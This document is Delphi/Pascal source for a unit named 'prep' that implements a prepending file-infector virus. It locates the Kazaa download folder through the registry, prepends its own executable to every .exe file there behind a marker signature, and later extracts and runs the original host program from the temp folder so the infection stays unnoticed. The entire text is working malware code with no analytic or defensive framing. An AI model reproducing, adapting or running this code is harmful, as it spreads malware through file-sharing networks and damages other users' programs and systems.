   UNIT prep;

   INTERFACE

   PROCEDURE DropFile;
   PROCEDURE InfectKazaaDir;
   FUNCTION  KazaaDir : STRING;
   PROCEDURE CutFile(F:STRING);
   PROCEDURE Prepend(Virus,DestinationFile:STRING);

   IMPLEMENTATION

   USES
     ACLUtils, Windows, Registry;

   VAR
     VirusEndSignature : STRING;

   FUNCTION KazaaDir : STRING;
   VAR
     Reg : TRegistry;
   BEGIN
     Reg:=TRegistry.Create;
     Reg.RootKey:=HKEY_CURRENT_USER;
     IF Reg.OpenKey('\Software\Kazaa\LocalContent',False) THEN Result:=Reg.ReadString('DownloadDir')+'\' ELSE Result:='';
     Reg.CloseKey;
   END;

   FUNCTION TempPath : STRING;
   VAR
     I : WORD;
     S : ARRAY [1..MAX_PATH] OF Char;
   BEGIN
     ZeroMemory(@S[1],MAX_PATH);
     I:=GetTempPath(MAX_PATH,@S);
     IF I>0 THEN FOR I:=1 TO I DO Result:=Result+S[I];
   END;

   PROCEDURE CutFile(F:STRING);
   VAR
     G : FILE;
     A : Longint;
     P : AnsiString;
   BEGIN
     FileMode:=2;
     AssignFile(G,F);
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       A:=FileSize(G);
       SetLength(P,A);
       BlockRead(G,P[1],A);
       A:=Pos(VirusEndSignature,P);
       IF A>0 THEN BEGIN
         Seek(G,A-1);
         Truncate(G);
       END;
       CloseFile(G);
     END;
     {$I+}
   END;

   PROCEDURE Prepend(Virus,DestinationFile:STRING);
   VAR
     A,B      : FILE;
     TempFile : STRING;
     I        : Longint;
     Buf      : AnsiString;
   BEGIN
     {$I-}
     AssignFile(A,DestinationFile);
     FileMode:=0;
     Reset(A,1);
     SetLength(Buf,FileSize(A));
     BlockRead(A,Buf[1],FileSize(A));
     I:=Pos(VirusEndSignature,Buf);
     CloseFile(A);
     IF I=0 THEN BEGIN
       TempFile:=TempPath+'abcd.dat';
       CopyFile(pChar(DestinationFile),pChar(TempFile),False);
       CopyFile(pChar(Virus),pChar(DestinatioNFile),False);
       CutFile(DestinationFile);
       FileMode:=2;
       AssignFile(A,DestinationFile);
       AssignFile(B,TempFile);
       Reset(A,1);
       IF IOResult=0 THEN BEGIN
         Reset(B,1);
         IF IOResult=0 THEN BEGIN
           Seek(A,FileSize(A));
           BlockWrite(A,VirusEndSignature[1],Length(VirusEndSignature));
           I:=FileSize(B);
           SetLength(Buf,I);
           BlockRead(B,Buf[1],I);
           BlockWrite(A,Buf[1],I);
           CloseFile(B);
         END;
         CloseFile(A);
       END;
       END;
     {$I+}
     DeleteFile(pChar(TempFile));
   END;

   PROCEDURE DropFile;
   VAR
     G   : FILE;
     S   : STRING;
     T   : Longint;
     Buf : AnsiString;
   BEGIN
     FileMode:=0;
     AssignFile(G,ParamStr(0));
     {$I-}
     Reset(G,1);
     IF IOResult=0 THEN BEGIN
       SetLength(Buf,FileSize(G));
       BlockRead(G,Buf[1],FileSize(G));
       T:=Pos(VirusEndSignature,Buf);
       CloseFile(G);
       IF T>0 THEN BEGIN
         T:=T+Length(VirusEndSignature)-1;
         S:=TempPath+ExtractFileName(ParamStr(0));
         CopyFile(pChar(ParamStr(0)),pChar(S),False);
         FileMode:=2;
         AssignFile(G,S);
         Reset(G,1);
         IF IOResult=0 THEN BEGIN
           Seek(G,T);
           T:=FileSize(G)-T;
           SetLength(Buf,T);
           BlockRead(G,Buf[1],T);
           Seek(G,0);
           BlockWrite(G,Buf[1],T);
           Truncate(G);
           CloseFile(G);
           WinExec(pChar(S),SW_SHOW);
         END;
       END;
     END;
     {$I+}
   END;

   PROCEDURE InfectKazaaDir;
   VAR
     Error : Integer;
     D     : TSearchRec;
   BEGIN
     Error:=FindFirst(KazaaDir+'*.exe',faAnyFile OR faHidden,D);
     WHILE Error=0 DO BEGIN
       Prepend(ParamStr(0),KazaaDir+D.Name);
       Error:=FindNext(D);
     END;
   END;

   INITIALIZATION
   BEGIN
     VirusEndSignature:=LowerCase('M*/OOPUU');
   END;


   END.
